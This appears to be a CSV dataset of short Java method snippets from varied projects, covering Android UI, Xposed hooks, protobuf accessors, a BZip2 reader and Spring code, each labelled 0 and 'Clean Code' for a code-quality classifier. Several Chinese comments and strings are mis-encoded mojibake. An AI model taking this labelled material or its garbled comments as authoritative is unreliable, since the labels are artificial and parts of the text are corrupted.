text,label,text_label
"@PostMapping(""/queryAttendanceEmpMonthDailyDetailPageList"") @ApiOperation(""鏌ヨ鎵撳崱姒傚喌鍒楄〃"") public Result<BasePage<QueryAttendanceEmpMonthDetailVO>> queryAttendanceEmpMonthDetailPageList(@RequestBody QueryAttendanceEmpMonthRecordBO queryAttendanceEmpMonthRecordBO){
  BasePage<QueryAttendanceEmpMonthDetailVO> page=attendanceClockService.queryAttendanceEmpMonthDetailPageList(queryAttendanceEmpMonthRecordBO);
  return Result.ok(page);
}
",0,Clean Code
"/** 
 * Invoked if a comment has been appended to a function node.
 * @param node The function node where the comment has been appended.
 * @param comment The comment that has been appended.
 */
void appendedFunctionNodeComment(NodeType node,CommentType comment);
",0,Clean Code
"private SerializableRange buildRange(Map<String,String> caseInsensitiveParams){
  if (numParallelSubtasks <= 0 || indexOfThisSubtask < 0) {
    return SerializableRange.ofFullRange();
  }
  if (caseInsensitiveParams == null || caseInsensitiveParams.isEmpty() || !caseInsensitiveParams.containsKey(ENABLE_KEY_HASH_RANGE_KEY)) {
    return SerializableRange.ofFullRange();
  }
  final String enableKeyHashRange=caseInsensitiveParams.get(ENABLE_KEY_HASH_RANGE_KEY);
  if (!Boolean.parseBoolean(enableKeyHashRange)) {
    return SerializableRange.ofFullRange();
  }
  final Range range=SourceSinkUtils.distributeRange(numParallelSubtasks,indexOfThisSubtask);
  return SerializableRange.of(range);
}",0,Clean Code
"/** 
 * 娣诲姞瀛楀吀鍒楄〃
 * @param dicts 瀛楀吀鍒楄〃
 * @param columns 鍒楅泦鍚�
 */
public static void addDicts(Set<String> dicts,List<GenTableColumn> columns){
  for (  GenTableColumn column : columns) {
    if (!column.isSuperColumn() && StringUtils.isNotEmpty(column.getDictType()) && StringUtils.equalsAny(column.getHtmlType(),new String[]{GenConstants.HTML_SELECT,GenConstants.HTML_RADIO,GenConstants.HTML_CHECKBOX})) {
      dicts.add(""'"" + column.getDictType() + ""'"");
    }
  }
}
",0,Clean Code
"private boolean init(final boolean isFirstStream) throws IOException {
  if (null == bin) {
    throw new IOException(""No InputStream"");
  }
  if (!isFirstStream) {
    bin.clearBitCache();
  }
  final int magic0=readNextByte(this.bin);
  if (magic0 == -1 && !isFirstStream) {
    return false;
  }
  final int magic1=readNextByte(this.bin);
  final int magic2=readNextByte(this.bin);
  if (magic0 != 'B' || magic1 != 'Z' || magic2 != 'h') {
    throw new IOException(isFirstStream ? ""Stream is not in the BZip2 format"" : ""Garbage after a valid BZip2 stream"");
  }
  final int blockSize=readNextByte(this.bin);
  if ((blockSize < '1') || (blockSize > '9')) {
    throw new IOException(""BZip2 block size is invalid"");
  }
  this.blockSize100k=blockSize - '0';
  this.computedCombinedCRC=0;
  return true;
}",0,Clean Code
"@Override public Iterator<GameAvatar> iterator(){
  return getAvatars().values().iterator();
}
",0,Clean Code
"@Override protected void after(MethodHookParam param){
  XposedHelpers.setBooleanField(param.thisObject,""mSpringBackEnable"",false);
}
@Override protected void after(MethodHookParam param){
  ((View)param.thisObject).setOverScrollMode(View.OVER_SCROLL_NEVER);
  XposedHelpers.setBooleanField(param.thisObject,""mSpringBackEnable"",false);
}
",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 8;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public LineupInfoOuterClass.LineupInfo getMutableLineup(){
  bitField0_|=0x00000004;
  return lineup;
}",0,Clean Code
"public ModIconCache(){
  cachePath=getImageCachePath();
  if (!cachePath.exists() && !cachePath.isFile() && Tools.DIR_CACHE.canWrite()) {
    if (!cachePath.mkdirs())     throw new RuntimeException(""Failed to create icon cache directory"");
  }
}
",0,Clean Code
"public GGProPlayNodeInfo(GProPlayNodeInfo gProPlayNodeInfo){
  this.mInfo=gProPlayNodeInfo;
}
",0,Clean Code
"public static long allocateMemory(long size){
  return UNSAFE.allocateMemory(size);
}
",0,Clean Code
"private static String generateString(Pattern pattern,String prefix,int min,int max){
  if (min <= 0 && max >= 0 && pattern.matcher(prefix).matches())   return prefix;
  if (max <= 0) {
    return DEFAULT;
  }
  List<Character> candidates=new ArrayList<>();
  generateCandidates(candidates,pattern,prefix);
  Collections.shuffle(candidates);
  return verifyAndReturn(pattern,prefix,min,max,candidates);
}",0,Clean Code
"@Override public SnapshotPendingSplitsState snapshotState(long checkpointId){
  SnapshotPendingSplitsState state=new SnapshotPendingSplitsState(alreadyProcessedTables,remainingSplits,assignedSplits,tableSchemas,splitFinishedOffsets,assignerStatus,remainingTables,isTableIdCaseSensitive,true,chunkSplitter.snapshotState(checkpointId));
  if (checkpointIdToFinish == null && AssignerStatus.isAssigningSnapshotSplits(assignerStatus) && allSnapshotSplitsFinished()) {
    checkpointIdToFinish=checkpointId;
  }
  return state;
}
",0,Clean Code
"private void callOnResume(Activity activity){
  if (activity.isDestroyed() || activity.isFinishing() || activity instanceof DialogXFloatingWindowActivity) {
    return;
  }
  if (onActivityResumeCallBack != null) {
    onActivityResumeCallBack.getActivity(activity);
  }
}
",0,Clean Code
"public Boolean isStream(){
  return this.stream;
}
",0,Clean Code
"/** 
 * 鍦ㄦ粦鍔ㄦ垨鑰呰烦杞殑杩囩▼涓紝绗竴娆″垱寤篺ragment鐨勬椂鍊欏潎浼氳皟鐢╫nResume鏂规硶
 */
@Override public void onResume(){
  super.onResume();
  if (!mIsFirstVisible) {
    if (!isHidden() && !currentVisibleState && getUserVisibleHint()) {
      dispatchUserVisibleHint(true);
    }
  }
}
",0,Clean Code
"public static final com.google.protobuf.Descriptors.Descriptor getDescriptor(){
  return OperateLogEntity.internal_static_Entity_descriptor;
}
",0,Clean Code
"@NonNull List<Integer> getSpecialType();
",0,Clean Code
"@EventHandler private void onRender(Render2DEvent event){
  if (Utils.isLoading())   return;
  if (!active || shouldHideHud())   return;
  if ((mc.options.hudHidden || mc.inGameHud.getDebugHud().shouldShowDebugHud()) && !HudEditorScreen.isOpen())   return;
  HudRenderer.INSTANCE.begin(event.drawContext);
  for (  HudElement element : elements) {
    element.updatePos();
    if (element.isActive())     element.render(HudRenderer.INSTANCE);
  }
  HudRenderer.INSTANCE.end();
}",0,Clean Code
"public void setParent(View parent){
  if (this.parent == parent)   return;
  if (this.parent != null) {
    this.parent.removeOnAttachStateChangeListener(parentAttachListener);
    if (this.parent.isAttachedToWindow() && !parent.isAttachedToWindow()) {
      imageReceiver.onDetachedFromWindow();
    }
  }
  if ((this.parent == null || !this.parent.isAttachedToWindow()) && parent != null && parent.isAttachedToWindow()) {
    imageReceiver.onAttachedToWindow();
  }
  this.parent=parent;
  imageReceiver.setParentView(parent);
  if (parent != null) {
    parent.addOnAttachStateChangeListener(parentAttachListener);
  }
}
",0,Clean Code
"/** 
 * Take a list of ItemStacks and amalgamate where possible.<br>
 * @param inputStacks a list of ItemStacks
 * @return a list of ItemStacks, where all items of the same type are grouped into one stack.
 */
public static NonNullList<ItemStack> consolidateItemStacks(NonNullList<ItemStack> inputStacks){
  NonNullList<ItemStack> outputStacks=NonNullList.create();
  for (  ItemStack sourceIS : inputStacks) {
    boolean bFound=false;
    for (    ItemStack destIS : outputStacks) {
      if (destIS != null && sourceIS != null && itemStackIngredientsMatch(destIS,sourceIS)) {
        bFound=true;
        destIS.setCount(destIS.getCount() + sourceIS.getCount());
      }
    }
    if (!bFound) {
      assert sourceIS != null;
      outputStacks.add(sourceIS.copy());
    }
  }
  return outputStacks;
}
",0,Clean Code
"private void clearRecent(){
  if ((type == TYPE_REACTIONS || type == TYPE_TAGS) && onRecentClearedListener != null) {
    onRecentClearedListener.onRecentCleared();
  }
}
",0,Clean Code
"@Override public void afterPropertiesSet() throws Exception {
  if (someConfigurationMethod()) {
    userValidator=beanFactory.getBean(""simpleUserValidator"",UserValidator.class);
  }
 else {
    userValidator=beanFactory.getBean(""complexUserValidator"",UserValidator.class);
  }
}
",0,Clean Code
"@Override public MoonBoxResult<String> saveRecord(String body){
  Assert.notNull(body,""save record body cannot be null"");
  RecordWrapper wrapper=SerializerWrapper.hessianDeserialize(body,RecordWrapper.class);
  if (wrapper == null || StringUtils.isEmpty(wrapper.getAppName()) || StringUtils.isBlank(wrapper.getTaskRunId())) {
    return MoonBoxResult.createFailResponse(""invalid request"");
  }
  AgentConfig agentConfig=taskConfigService.getTaskConfigCache(wrapper.getTaskRunId());
  Assert.notNull(agentConfig,""agent config query error!recordTaskRunId="" + wrapper.getTaskRunId());
  RecordWrapperEntity entity=new RecordWrapperEntity();
  BeanUtils.copyProperties(wrapper,entity);
  entity.setWrapperData(body);
  entity.setTemplateId(agentConfig.getRecordTemplateId());
  try {
    Object response=SerializerWrapper.hessianDeserialize(wrapper.getEntranceInvocation().getResponseSerialized(),Object.class);
    if (response instanceof String) {
      entity.setResponse((String)response);
    }
 else {
      entity.setResponse(JSON.toJSONString(response));
    }
  }
 catch (  SerializeException e) {
    log.error(""deserialize response body failed, response:{}."",wrapper.getEntranceInvocation().getResponseSerialized(),e);
  }
  Object[] objects=SerializerProvider.instance().provide(Serializer.Type.HESSIAN).deserialize(wrapper.getEntranceInvocation().getRequestSerialized(),Object[].class);
  try {
    entity.setRequest(JacksonUtils.serialize(objects));
  }
 catch (  Exception e) {
    log.error(""deserialize request body failed, body:{}."",wrapper.getEntranceInvocation().getRequestSerialized(),e);
  }
  String errMsg=recordRedisService == null ? """" : recordRedisService.judgeSave(wrapper,agentConfig.getRecordAgentConfig(),entity);
  if (StringUtils.isNotEmpty(errMsg)) {
    return MoonBoxResult.createFailResponse(errMsg);
  }
  boolean isSuccess=recordDataService.saveData(entity);
  return isSuccess ? MoonBoxResult.createSuccess(""-/-"") : MoonBoxResult.createFailResponse(""failed"");
}
",0,Clean Code
"/** 
 * Set the node below this one in the k-d tree.
 * @param node The node being added to the tree.
 */
void setBelow(DimensionNode node){
  if (node == null) {
    this.below=null;
  }
 else   if ((this.dimension + 1 == node.dimension) || (this.dimension == maxD && node.dimension == 0)) {
    this.below=node;
  }
 else {
    throw new IllegalArgumentException(""Setting the below/left node failed because the dimensions are incorrect."");
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 plane_id = 6;</code>
 * @param value the planeId to set
 * @return this
 */
public QuitLineupCsReq setPlaneId(final int value){
  bitField0_|=0x00000001;
  planeId=value;
  return this;
}",0,Clean Code
"public GGProBlockInfo(GProBlockInfo gProBlockInfo){
  this.mInfo=gProBlockInfo;
}
",0,Clean Code
"private PostgresDataType getMeaningfulType(){
  if (Randomly.getBooleanWithSmallProbability() || columns == null || columns.isEmpty()) {
    return PostgresDataType.getRandomType();
  }
 else {
    return Randomly.fromList(columns).getType();
  }
}
",0,Clean Code
"@Override public String getCriterionDescription(){
  return ""OR"";
}
",0,Clean Code
"StackFrameLoop(List<Object> frames,int count){
  this.count=count;
  this.frames=frames;
}
",0,Clean Code
"@VisibleForTesting ImmutablePair<String,Integer> getWorkflowNameAndVersion(String nameVersionStr){
  int lastIndexOfDelimiter=nameVersionStr.lastIndexOf(INDEX_DELIMITER);
  if (lastIndexOfDelimiter == -1) {
    throw new IllegalStateException(nameVersionStr + "" is not in the 'workflowName"" + INDEX_DELIMITER+ ""version' pattern."");
  }
  String workflowName=nameVersionStr.substring(0,lastIndexOfDelimiter);
  String versionStr=nameVersionStr.substring(lastIndexOfDelimiter + 1);
  try {
    return new ImmutablePair<>(workflowName,Integer.parseInt(versionStr));
  }
 catch (  NumberFormatException e) {
    throw new IllegalStateException(versionStr + "" in "" + nameVersionStr+ "" is not a valid number."");
  }
}",0,Clean Code
"public void setReplyingMessageObject(MessageObject messageObject){
  if (messageObject != null) {
    if (botMessageObject == null && botButtonsMessageObject != replyingMessageObject) {
      botMessageObject=botButtonsMessageObject;
    }
    replyingMessageObject=messageObject;
    if (!(parentFragment != null && parentFragment.isTopic && parentFragment.getThreadMessage() == replyingMessageObject)) {
      setButtons(replyingMessageObject,true);
    }
  }
 else   if (replyingMessageObject == botButtonsMessageObject) {
    replyingMessageObject=null;
    setButtons(botMessageObject,false);
    botMessageObject=null;
  }
 else {
    replyingMessageObject=null;
  }
  MediaController.getInstance().setReplyingMessage(messageObject,getThreadMessage());
  updateFieldHint(false);
}
",0,Clean Code
"public static void main(String[] args){
  int N=20;
  int M=100;
  int testTime=100000;
  System.out.println(""娴嬭瘯寮�濮�"");
  for (int i=0; i < testTime; i++) {
    int size=(int)(Math.random() * (N + 1));
    int[] arr=randomArray(size,M);
    int sum=(int)(Math.random() * ((M << 1) + 1)) - M;
    boolean ans1=isSum1(arr,sum);
    boolean ans2=isSum2(arr,sum);
    boolean ans3=isSum3(arr,sum);
    boolean ans4=isSum4(arr,sum);
    if (ans1 ^ ans2 || ans3 ^ ans4 || ans1 ^ ans3) {
      System.out.println(""鍑洪敊浜嗭紒"");
      System.out.print(""arr : "");
      for (      int num : arr) {
        System.out.print(num + "" "");
      }
      System.out.println();
      System.out.println(""sum : "" + sum);
      System.out.println(""鏂规硶涓�绛旀 : "" + ans1);
      System.out.println(""鏂规硶浜岀瓟妗� : "" + ans2);
      System.out.println(""鏂规硶涓夌瓟妗� : "" + ans3);
      System.out.println(""鏂规硶鍥涚瓟妗� : "" + ans4);
      break;
    }
  }
  System.out.println(""娴嬭瘯缁撴潫"");
}",0,Clean Code
"@Override public void onScrolled(RecyclerView recyclerView,int dx,int dy){
  if (fwdRestrictedHint != null) {
    fwdRestrictedHint.hide();
  }
  checkListViewScroll();
  if (participantsMap != null && !usersEndReached && layoutManager.findLastVisibleItemPosition() > membersEndRow - 8) {
    getChannelParticipants(false);
  }
  sharedMediaLayout.setPinnedToTop(sharedMediaLayout.getY() <= 0);
  updateBottomButtonY();
}",0,Clean Code
"/** 
 * Use  {@link Preconditions} to check for required {@link TaskDef} fields, throwing a Runtimeexception if validations fail.
 * @param taskDef The {@code TaskDef} to check.
 */
private void validate(TaskDef taskDef){
  Preconditions.checkNotNull(taskDef,""TaskDef object cannot be null"");
  Preconditions.checkNotNull(taskDef.getName(),""TaskDef name cannot be null"");
}
/** 
 * Use  {@link Preconditions} to check for required {@link WorkflowDef} fields, throwing aRuntime exception if validations fail.
 * @param def The {@code WorkflowDef} to check.
 */
private void validate(WorkflowDef def){
  Preconditions.checkNotNull(def,""WorkflowDef object cannot be null"");
  Preconditions.checkNotNull(def.getName(),""WorkflowDef name cannot be null"");
}
",0,Clean Code
"@Override public void actionPerformed(final ActionEvent e){
  m_color=CColorChooser.this.getColor();
}
",0,Clean Code
"@Override public void init(){
  findAndHookMethod(""com.miui.home.launcher.hotseats.HotSeats"",""dispatchTouchEvent"",MotionEvent.class,new MethodHook(){
    @Override protected void before(    final MethodHookParam param) throws Throwable {
      MotionEvent ev=(MotionEvent)param.args[0];
      if (ev == null)       return;
      ViewGroup hotSeat=(ViewGroup)param.thisObject;
      Context helperContext=hotSeat.getContext();
      if (helperContext == null)       return;
      if (mDetectorHorizontal == null)       mDetectorHorizontal=new GestureDetector(helperContext,new SwipeListenerHorizontal(hotSeat));
      mDetectorHorizontal.onTouchEvent(ev);
    }
  }
);
}",0,Clean Code
"/** 
 * <code>repeated .RogueRecordAvatar avatar_list = 5;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<RogueRecordAvatarOuterClass.RogueRecordAvatar> getMutableAvatarList(){
  bitField0_|=0x00000002;
  return avatarList;
}",0,Clean Code
